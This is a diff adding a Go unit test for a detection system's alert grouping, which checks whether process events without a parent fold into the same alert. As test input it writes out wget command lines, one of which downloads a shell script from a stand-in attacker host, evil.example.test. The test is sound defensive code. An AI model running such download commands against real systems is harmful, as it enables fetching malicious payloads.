@@ -118,6 +118,67 @@ func TestGroupingByProcessShape(t *testing.T) {
 	}
 }
 
+// Linux file and network events do not say what started the process. A wget from a shell
+// must still not fold into the alert for a wget from a scheduled job.
+func TestGroupingWithoutAParent(t *testing.T) {
+	ctx := context.Background()
+	s := open(t)
+	record := func(p *event.Process) (*Alert, bool) {
+		t.Helper()
+		a, isNew, err := s.RecordAlert(ctx, AlertInput{
+			Rule: AlertRule{ID: "r1"}, Severity: SevMedium,
+			Event: &event.Event{ID: event.NewID(), Host: event.Host{ID: "h1"}, Process: p},
+		})
+		if err != nil {
+			t.Fatal(err)
+		}
+		return a, isNew
+	}
+	fileEvent := func(cmd string) *event.Process {
+		return &event.Process{EntityID: event.NewID(), Name: "wget", Executable: "/usr/bin/wget", CommandLine: cmd}
+	}
+
+	// A job's command line repeats, so its runs fold.
+	const job = "wget -O /tmp/plugins/user.scripts.plg https://example.test/x"
+	first, isNew := record(fileEvent(job))
+	if !isNew {
+		t.Fatal("first hit is not new")
+	}
+	if a, isNew := record(fileEvent(job)); isNew || a.ID != first.ID {
+		t.Fatal("repeats of one command line did not fold")
+	}
+	// Someone else's wget does not.
+	if a, isNew := record(fileEvent("wget -O /tmp/x.sh https://evil.example.test/x.sh")); !isNew || a.ID == first.ID {
+		t.Fatal("a different command line folded into the job's alert")
+	}
+
+	// A network event has no command line either, so each process stands alone.
+	network := func() *event.Process {
+		return &event.Process{EntityID: event.NewID(), Name: "curl", Executable: "/usr/bin/curl"}
+	}
+	record(network())
+	if _, isNew := record(network()); !isNew {
+		t.Fatal("two processes with nothing in common but the executable folded")
+	}
+
+	// An event from a log has only a name, and folds by it, as it did before.
+	sshd := func() *event.Process { return &event.Process{PID: 42, Name: "sshd"} }
+	a, _ := record(sshd())
+	if b, isNew := record(sshd()); isNew || b.ID != a.ID {
+		t.Fatal("log events with a name did not fold")
+	}
+	if _, isNew := record(&event.Process{PID: 43, Name: "sudo"}); !isNew {
+		t.Fatal("log events with different names folded")
+	}
+
+	// The same command line under a known parent is its own shape.
+	withParent := fileEvent(job)
+	withParent.Parent = &event.Process{Executable: "/usr/bin/php"}
+	if a, isNew := record(withParent); !isNew || a.ID == first.ID {
+		t.Fatal("a known parent folded into an unknown one")
+	}
+}
+
 func TestOldOpenAlertsStopAbsorbing(t *testing.T) {
 	ctx := context.Background()
 	s := open(t)
